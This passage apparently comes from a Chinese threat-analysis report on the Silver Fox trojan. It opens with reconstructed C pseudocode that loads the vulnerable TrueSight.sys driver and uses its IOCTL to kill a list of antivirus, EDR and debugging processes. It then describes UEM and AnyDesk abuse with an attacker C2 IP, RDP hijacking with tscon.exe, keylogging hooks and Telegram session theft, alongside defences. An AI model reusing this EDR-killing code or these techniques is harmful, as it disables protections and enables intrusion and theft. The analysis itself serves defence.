+<span class="cm"> * 银狐木马 BYOVD 内核态进程终止逻辑还原（C伪代码）</span>
+<span class="cm"> * 基于 TrueSight.sys 驱动 IOCTL 0x22e044 漏洞</span>
+<span class="cm"> * ============================================================ */</span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;winioctl.h&gt;</span>
+
+<span class="cp">#define TRUESIGHT_DRIVER_NAME   L&quot;\\\\.\\TrueSight&quot;</span>
+<span class="cp">#define TRUESIGHT_IOCTL_KILL    0x22e044   </span><span class="cm">/* 终止进程的IOCTL码 */</span>
+<span class="cp">#define PROCESS_TERMINATE_FLAG  0x1</span>
+
+<span class="cm">/* 内核终止请求结构体 */</span>
+<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_KILL_PROCESS_REQUEST</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">ULONG</span><span class="w"> </span><span class="n">ProcessId</span><span class="p">;</span><span class="w">        </span><span class="cm">/* 目标进程PID */</span>
+<span class="w">    </span><span class="n">ULONG</span><span class="w"> </span><span class="n">Flags</span><span class="p">;</span><span class="w">            </span><span class="cm">/* 终止标志 */</span>
+<span class="w">    </span><span class="n">WCHAR</span><span class="w"> </span><span class="n">ProcessName</span><span class="p">[</span><span class="mi">260</span><span class="p">];</span><span class="w"> </span><span class="cm">/* 目标进程名（部分IOCTL版本使用） */</span>
+<span class="p">}</span><span class="w"> </span><span class="n">KILL_PROCESS_REQUEST</span><span class="p">;</span>
+
+<span class="cm">/* 212个安全软件进程名列表（节选） */</span>
+<span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">security_process_list</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;360tray.exe&quot;</span><span class="p">,</span><span class="w">      </span><span class="sa">L</span><span class="s">&quot;360sd.exe&quot;</span><span class="p">,</span><span class="w">       </span><span class="sa">L</span><span class="s">&quot;360safe.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;ZhuDongFangYu.exe&quot;</span><span class="p">,</span><span class="sa">L</span><span class="s">&quot;QAXTray.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;qaxsafe.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;rstray.exe&quot;</span><span class="p">,</span><span class="w">       </span><span class="sa">L</span><span class="s">&quot;RavMonD.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;RavTask.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;kxescore.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;kxetray.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;ksafe.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;kavstart.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;kissvc.exe&quot;</span><span class="p">,</span><span class="w">      </span><span class="sa">L</span><span class="s">&quot;avp.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;avpui.exe&quot;</span><span class="p">,</span><span class="w">        </span><span class="sa">L</span><span class="s">&quot;avgsvc.exe&quot;</span><span class="p">,</span><span class="w">      </span><span class="sa">L</span><span class="s">&quot;avgui.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;MsMpEng.exe&quot;</span><span class="p">,</span><span class="w">      </span><span class="sa">L</span><span class="s">&quot;SecurityHealthService.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;MsSense.exe&quot;</span><span class="p">,</span><span class="w">      </span><span class="sa">L</span><span class="s">&quot;SenseCE.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;QQPCTray.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;QQPCRTP.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;HipsTray.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;HipsDaemon.exe&quot;</span><span class="p">,</span><span class="w">  </span><span class="sa">L</span><span class="s">&quot;HipsMain.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;safemon.exe&quot;</span><span class="p">,</span><span class="w">      </span><span class="sa">L</span><span class="s">&quot;Usysdiag.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;edrsvc.exe&quot;</span><span class="p">,</span><span class="w">       </span><span class="sa">L</span><span class="s">&quot;edr_agent.exe&quot;</span><span class="p">,</span><span class="w">   </span><span class="sa">L</span><span class="s">&quot;edr_monitor.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;crowdstrike.exe&quot;</span><span class="p">,</span><span class="w">  </span><span class="sa">L</span><span class="s">&quot;CSFalconService.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;TaniumClient.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;TaniumCX.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;CarbonBlack.exe&quot;</span><span class="p">,</span><span class="w">  </span><span class="sa">L</span><span class="s">&quot;cb.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;SentinelAgent.exe&quot;</span><span class="p">,</span><span class="sa">L</span><span class="s">&quot;SentinelService.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;wmic.exe&quot;</span><span class="p">,</span><span class="w">         </span><span class="sa">L</span><span class="s">&quot;Procmon.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;Procmon64.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;x64dbg.exe&quot;</span><span class="p">,</span><span class="w">       </span><span class="sa">L</span><span class="s">&quot;x32dbg.exe&quot;</span><span class="p">,</span><span class="w">      </span><span class="sa">L</span><span class="s">&quot;ollydbg.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;ida.exe&quot;</span><span class="p">,</span><span class="w">          </span><span class="sa">L</span><span class="s">&quot;ida64.exe&quot;</span><span class="p">,</span><span class="w">       </span><span class="sa">L</span><span class="s">&quot;idaq.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;Wireshark.exe&quot;</span><span class="p">,</span><span class="w">    </span><span class="sa">L</span><span class="s">&quot;tcpdump.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;ProcessHacker.exe&quot;</span><span class="p">,</span><span class="sa">L</span><span class="s">&quot;procexp.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;procexp64.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="sa">L</span><span class="s">&quot;autoruns.exe&quot;</span><span class="p">,</span><span class="w">     </span><span class="sa">L</span><span class="s">&quot;taskmgr.exe&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="cm">/* ... 共212个进程名，覆盖国内外主流安全软件及分析工具 ... */</span>
+<span class="p">};</span>
+<span class="cp">#define SECURITY_PROCESS_COUNT (sizeof(security_process_list) / sizeof(security_process_list[0]))</span>
+
+<span class="cm">/* 加载TrueSight驱动 */</span>
+<span class="n">HANDLE</span><span class="w"> </span><span class="nf">load_truesight_driver</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">SC_HANDLE</span><span class="w"> </span><span class="n">hSCManager</span><span class="p">;</span>
+<span class="w">    </span><span class="n">SC_HANDLE</span><span class="w"> </span><span class="n">hService</span><span class="p">;</span>
+<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hDevice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">;</span>
+
+<span class="w">    </span><span class="cm">/* 将驱动文件释放到临时目录 */</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">driver_path</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+<span class="w">    </span><span class="n">GetTempPathA</span><span class="p">(</span><span class="n">MAX_PATH</span><span class="p">,</span><span class="w"> </span><span class="n">driver_path</span><span class="p">);</span>
+<span class="w">    </span><span class="n">strcat_s</span><span class="p">(</span><span class="n">driver_path</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_PATH</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;TrueSight.sys&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 从overlay中提取并写入驱动文件 */</span>
+<span class="w">    </span><span class="n">extract_driver_from_overlay</span><span class="p">(</span><span class="n">driver_path</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 通过SCM创建并启动驱动服务 */</span>
+<span class="w">    </span><span class="n">hSCManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenSCManagerW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">hSCManager</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">hService</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateServiceW</span><span class="p">(</span>
+<span class="w">        </span><span class="n">hSCManager</span><span class="p">,</span>
+<span class="w">        </span><span class="sa">L</span><span class="s">&quot;TrueSight&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="sa">L</span><span class="s">&quot;TrueSight System Guard&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="n">SERVICE_ALL_ACCESS</span><span class="p">,</span>
+<span class="w">        </span><span class="n">SERVICE_KERNEL_DRIVER</span><span class="p">,</span>
+<span class="w">        </span><span class="n">SERVICE_DEMAND_START</span><span class="p">,</span>
+<span class="w">        </span><span class="n">SERVICE_ERROR_NORMAL</span><span class="p">,</span>
+<span class="w">        </span><span class="sa">L</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">??</span><span class="se">\\</span><span class="s">C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">TrueSight.sys&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">hService</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/* 服务可能已存在，尝试打开 */</span>
+<span class="w">        </span><span class="n">hService</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenServiceW</span><span class="p">(</span><span class="n">hSCManager</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;TrueSight&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">SERVICE_ALL_ACCESS</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hService</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">StartServiceW</span><span class="p">(</span><span class="n">hService</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">        </span><span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">hService</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">hSCManager</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 打开驱动设备句柄 */</span>
+<span class="w">    </span><span class="n">hDevice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileW</span><span class="p">(</span>
+<span class="w">        </span><span class="n">TRUESIGHT_DRIVER_NAME</span><span class="p">,</span>
+<span class="w">        </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span>
+<span class="w">        </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span>
+<span class="w">        </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">hDevice</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* 通过IOCTL终止指定进程 */</span>
+<span class="n">BOOL</span><span class="w"> </span><span class="nf">kill_process_via_driver</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hDevice</span><span class="p">,</span><span class="w"> </span><span class="n">ULONG</span><span class="w"> </span><span class="n">pid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">KILL_PROCESS_REQUEST</span><span class="w"> </span><span class="n">req</span><span class="p">;</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">bytes_returned</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">req</span><span class="p">.</span><span class="n">ProcessId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pid</span><span class="p">;</span>
+<span class="w">    </span><span class="n">req</span><span class="p">.</span><span class="n">Flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PROCESS_TERMINATE_FLAG</span><span class="p">;</span>
+<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">ProcessName</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">ProcessName</span><span class="p">));</span>
+
+<span class="w">    </span><span class="cm">/* 发送IOCTL 0x22e044 终止进程 */</span>
+<span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeviceIoControl</span><span class="p">(</span>
+<span class="w">        </span><span class="n">hDevice</span><span class="p">,</span>
+<span class="w">        </span><span class="n">TRUESIGHT_IOCTL_KILL</span><span class="p">,</span>
+<span class="w">        </span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">),</span>
+<span class="w">        </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">        </span><span class="o">&amp;</span><span class="n">bytes_returned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* 按进程名查找PID */</span>
+<span class="n">ULONG</span><span class="w"> </span><span class="nf">find_process_by_name</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">process_name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hSnapshot</span><span class="p">;</span>
+<span class="w">    </span><span class="n">PROCESSENTRY32W</span><span class="w"> </span><span class="n">pe32</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ULONG</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">hSnapshot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hSnapshot</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32W</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Process32FirstW</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_wcsicmp</span><span class="p">(</span><span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span><span class="w"> </span><span class="n">process_name</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">Process32NextW</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pe32</span><span class="p">));</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">pid</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* BYOVD 安全软件清除主流程 */</span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">byovd_security_kill_main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hDevice</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">killed_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="cm">/* 步骤1: 加载TrueSight驱动 */</span>
+<span class="w">    </span><span class="n">hDevice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">load_truesight_driver</span><span class="p">();</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hDevice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w">  </span><span class="cm">/* 驱动加载失败 */</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 步骤2: 遍历212个安全软件进程名列表，逐一终止 */</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">SECURITY_PROCESS_COUNT</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">ULONG</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">find_process_by_name</span><span class="p">(</span><span class="n">security_process_list</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">kill_process_via_driver</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span><span class="w"> </span><span class="n">pid</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">killed_count</span><span class="o">++</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 步骤3: 卸载驱动并清理痕迹 */</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+<span class="w">    </span><span class="n">unload_driver_service</span><span class="p">(</span><span class="sa">L</span><span class="s">&quot;TrueSight&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">delete_file_silent</span><span class="p">(</span><span class="sa">L</span><span class="s">&quot;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">TrueSight.sys&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">killed_count</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.3 对抗BYOVD的思路</h3>
+<p>BYOVD攻击的防御关键在于驱动加载控制。微软自Windows 11 22H2起引入的易受攻击驱动程序黑名单（Vulnerable Driver Blocklist）机制可有效阻止已知漏洞驱动的加载。企业应确保该功能处于启用状态，并通过WDAC（Windows Defender Application Control）策略进一步限制非签名驱动的加载。此外，EDR产品应注册内核回调监控驱动加载行为，对BYOVD特征（如临时目录释放驱动文件后立即通过SCM加载）进行告警。</p>
+<hr />
+<h2>十、管控终端滥用与合法工具武器化</h2>
+<h3>10.1 企业统一终端管理系统滥用</h3>
+<p>本轮攻击中最值得关注的新趋势是攻击者对企业统一终端管理系统（Unified Endpoint Management, UEM）的滥用。许多企业部署了统一终端管理系统用于远程运维、软件分发和策略管控，这些系统通常具备远程桌面接管、文件上传下载、自定义脚本执行、远程关机等高权限功能。银狐木马在完成安全软件清除后，通过以下方式将这些管控系统转化为隐蔽的远控后门：</p>
+<ol>
+<li>
+<p><strong>绕过人机验证码机制</strong>：管控系统在执行高风险操作（如远程桌面接管）时通常会弹出验证码要求用户确认。攻击者通过社工手段诱导用户输入验证码，或利用验证码机制的逻辑缺陷绕过验证，获取系统控制权。</p>
+</li>
+<li>
+<p><strong>注册表写入上线IP</strong>：木马在注册表中写入管控系统的上线配置，将控制端IP修改为攻击者控制的<code>156.251.16.226</code>，使受感染终端定期向攻击者控制端报到。</p>
+</li>
+<li>
+<p><strong>滥用功能清单</strong>：</p>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>被滥用功能</th>
+<th>攻击者用途</th>
+<th>隐蔽性评估</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>远程桌面接管</td>
+<td>完整可视化远程控制</td>
+<td>高，流量为管控系统正常通信</td>
+</tr>
+<tr>
+<td>文件上传下载</td>
+<td>窃取敏感文件、投递后续载荷</td>
+<td>高，利用管控系统合法文件传输通道</td>
+</tr>
+<tr>
+<td>自定义脚本执行</td>
+<td>任意命令执行、横向移动</td>
+<td>极高，脚本在管控系统进程上下文运行</td>
+</tr>
+<tr>
+<td>远程关机</td>
+<td>破坏性操作、配合重启触发Phantom Persistence</td>
+<td>中，关机行为本身可被审计</td>
+</tr>
+</tbody>
+</table>
+<p>这种滥用方式的核心威胁在于：攻击者利用的是企业自己部署的合法管控基础设施，所有远程操作流量都经过管控系统的加密通道传输，与正常运维流量无法区分。即使企业部署了网络层流量监控设备，也难以从合法管控流量中识别出恶意操作。</p>
+<h3>10.2 AnyDesk合法远控工具滥用</h3>
+<p>除管控系统外，攻击者还系统性地滥用了AnyDesk这一合法远控工具。攻击链路如下：</p>
+<ol>
+<li>
+<p><strong>静默安装</strong>：通过命令行参数实现AnyDesk的静默安装，安装过程不弹出任何用户界面。AnyDesk安装包本身具有合法数字签名，不会被安全软件标记为恶意软件。</p>
+</li>
+<li>
+<p><strong>配置改造为后门</strong>：安装完成后，攻击者修改AnyDesk配置文件，开启无人值守访问（Unattended Access），设置自动接受连接的密码，并将AnyDesk配置为开机自启动。改造后的AnyDesk等价于一个功能完整的隐蔽后门。</p>
+</li>
+<li>
+<p><strong>双控制链路</strong>：攻击者建立了两条控制链路——AnyDesk远程桌面通道用于可视化操作，银狐木马自身的C2通道用于自动化指令执行。两条链路互为备份，即使AnyDesk被发现卸载，木马C2通道仍可维持控制。</p>
+</li>
+</ol>
+<h3>10.3 tscon.exe劫持RDP会话</h3>
+<p><code>tscon.exe</code>是Windows自带的终端服务连接工具，正常用途是在RDP会话之间切换。攻击者利用该工具的特殊用法实现无需密码的RDP会话劫持：当以SYSTEM权限运行<code>tscon.exe &lt;SessionID&gt;</code>时，可直接切换到指定会话而无需输入用户密码。攻击者在获取SYSTEM权限后，枚举当前活动的RDP会话ID，通过tscon.exe劫持已登录用户的桌面会话，实现无需凭据的完整桌面接管。</p>
+<p>该技术的检测要点在于监控<code>tscon.exe</code>的异常调用行为——正常运维场景中tscon.exe极少被直接命令行调用，且调用者通常不是SYSTEM账户。</p>
+<hr />
+<h2>十一、关键功能模块解析</h2>
+<h3>11.1 键盘记录模块</h3>
+<p>银狐木马使用<code>SetWindowsHookExA</code>配合<code>WH_KEYBOARD_LL</code>（低级键盘钩子）实现全局键盘记录。该钩子类型安装在系统全局键盘消息链的头部，可捕获所有线程的键盘输入，包括其他进程的输入。</p>
+<div class="highlight"><pre><span></span><code>SetWindowsHookExA(WH_KEYBOARD_LL,    // 钩子类型：低级键盘
+                  LowLevelKeyboardProc, // 回调函数
+                  hInstance,            // 模块实例
+                  0);                   // 0表示全局钩子
+</code></pre></div>
+
+<p>低级键盘钩子的优势在于不需要将DLL注入到目标进程中，仅通过系统消息机制即可实现全局捕获，隐蔽性较高。记录的按键数据通过RC4加密后回传至C2服务器。</p>
+<h3>11.2 RC4加密引擎</h3>
+<p>银狐木马的数据回传采用自实现的RC4加密引擎，具有两个独特设计：</p>
+<ol>
+<li>
+<p><strong>4096字节分块加密</strong>：将待传输数据分割为4096字节的块，每块独立进行RC4加密。这种分块设计防止了大量数据使用同一密钥流导致的密码学弱化。</p>
+</li>
+<li>
+<p><strong>位置依赖密钥</strong>：每个4096字节块的RC4密钥并非固定不变，而是由基础密钥与块序号组合派生。这意味着即使攻击者获取了某一块的密钥，也无法直接解密其他块的数据。</p>
+</li>
+</ol>
+<h3>11.3 凭据窃取模块</h3>
+<p>银狐木马的凭据窃取模块覆盖多个高价值目标，其中Telegram会话劫持尤为值得注意。木马硬编码了Telegram桌面版的会话数据路径<code>%s\Telegram Desktop\tdata</code>，直接复制该目录下的会话文件即可在攻击者机器上恢复受害者的Telegram登录状态，无需重新输入密码或二次验证。</p>
+<p>此外，凭据窃取模块还覆盖浏览器保存密码、邮箱客户端配置、FTP客户端配置等多种凭据存储位置。</p>
+<h3>11.4 远控指令集</h3>
+<p>银狐木马核心控制层实现了56条远控指令，按功能分类如下：</p>
+<table>
+<thead>
+<tr>
+<th>功能类别</th>
+<th>指令示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>下载执行</td>
+<td>下载并运行指定URL的PE文件</td>
+<td>二阶段载荷投递</td>
+</tr>
+<tr>
+<td>TCP中继</td>
+<td>将受控终端作为跳板进行TCP端口转发</td>
+<td>横向移动与内网穿透</td>
+</tr>
+<tr>
+<td>键盘记录</td>
+<td>启动/停止键盘记录、回传记录数据</td>
+<td>凭据窃取</td>
+</tr>
+<tr>
+<td>屏幕截图</td>
+<td>定期截取屏幕画面并回传</td>
+<td>可视化监控</td>
+</tr>
+<tr>
+<td>文件管理</td>
+<td>上传、下载、删除、重命名文件</td>
+<td>数据窃取与载荷投递</td>
+</tr>
+<tr>
+<td>进程管理</td>
+<td>枚举、终止、注入进程</td>
+<td>环境控制</td>
+</tr>
+<tr>
+<td>破坏性清理</td>
